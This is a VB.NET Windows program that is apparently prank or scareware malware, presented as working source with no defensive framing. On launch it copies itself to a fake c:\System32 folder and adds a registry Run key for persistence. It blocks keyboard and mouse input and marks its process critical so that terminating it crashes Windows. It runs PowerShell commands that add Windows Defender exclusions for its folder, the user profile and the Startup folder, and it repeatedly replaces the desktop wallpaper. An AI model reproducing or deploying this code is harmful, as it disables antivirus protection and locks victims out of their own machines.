Imports System.IO
Imports System.Security.Principal
Imports System.Net
'Imports System.IO.Compression
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Management
Imports System.Management.Instrumentation
Imports System
Imports System.Diagnostics
Imports Microsoft.Win32
Public Class Form1
    Declare Function BlockInput Lib "user32" (ByVal fBlock As Boolean) As Integer
    Public Declare Sub RtlSetProcessIsCritical Lib "ntdll.dll" (ByVal NewValue As Boolean, ByVal OldValue As Boolean, ByVal WinLogon As Boolean)
    Private Declare Function GetAsyncKeyState Lib "User32" (ByVal vKey As Integer) As Integer
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    Public Sub AdicionarAplicacaoAoIniciar()
        Dim caminho As String = "c:\System32\a.exe"
        Try
            Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                key.SetValue(caminho, """" + Application.ExecutablePath + """")
            End Using
        Catch
            Throw
        End Try
    End Sub
    Public Sub RemoverAplicacaoAoIniciar()
        '  Dim caminho As String = Application.StartupPath & "\a.exe"
        Dim caminho As String = "c:\System32\a.exe"

        Try
            Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                key.DeleteValue(caminho, False)
            End Using
        Catch
            Throw
        End Try
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        If My.Computer.FileSystem.DirectoryExists("c:\system32") Then
            System.IO.Directory.Delete("c:\System32", True)
            End
        Else
            Timer2.Start()
            System.IO.Directory.CreateDirectory("c:\system32")
            FileCopy(Application.StartupPath & "\a.exe", "c:\system32\a.exe")
            AdicionarAplicacaoAoIniciar()
            BlockInput(True)
            Process.EnterDebugMode()
            RtlSetProcessIsCritical(True, False, False)
            Shell("CMD.exe /c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " + "C:\System32")
            Dim user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
            Dim startup = (user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
            Dim caminho = "C:\System32\load.ps1"
            Shell("CMD.exe /c powershell -NonInteractive -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
            IO.File.WriteAllText("C:\System32\load.ps1", "Add-MpPreference -ExclusionPath """ & startup & """")
            Shell("CMD.exe /c PowerShell -NonInteractive -ExecutionPolicy Bypass -Command " + caminho)
            Thread.Sleep(3000)
            Dim Location As String
            Location = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\oi.png"
            PictureBox1.Image.Save(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\oi.png")
            SystemParametersInfo(SETDESKWALLPAPER, 0, Location, UPDATEINIFILE)
            Timer1.Start()
            ' End
        End If
    End Sub


    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        BlockInput(False)
        ' RtlSetProcessIsCritical(False, False, False)
        Timer3.Start()
        Timer1.Stop()

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Me.Focus()
        Timer3.Start()
        Dim f2 As Boolean = GetAsyncKeyState(Keys.F2)
        If f2 = True Then
            RemoverAplicacaoAoIniciar()
            RtlSetProcessIsCritical(False, False, False)
            End
        End If

    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        '  My.Computer.Audio.Stop()
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\oi2.png") Then
            Dim Location As String
            'System.IO.File.Delete(Application.StartupPath & "\oi.png")
            Location = Application.StartupPath & "\oi2.png"
            '  PictureBox3.Image.Save(Application.StartupPath & "\oi.png")
            SystemParametersInfo(SETDESKWALLPAPER, 0, Location, UPDATEINIFILE)

        Else
            PictureBox2.Image.Save(Application.StartupPath & "\oi2.png")
        End If
        ' Dim Location As String
        ' Location = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\oi2.gif"
        ' PictureBox3.Image.Save(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\oi2.gif")
        ' SystemParametersInfo(SETDESKWALLPAPER, 0, Location, UPDATEINIFILE)
    End Sub


End Class
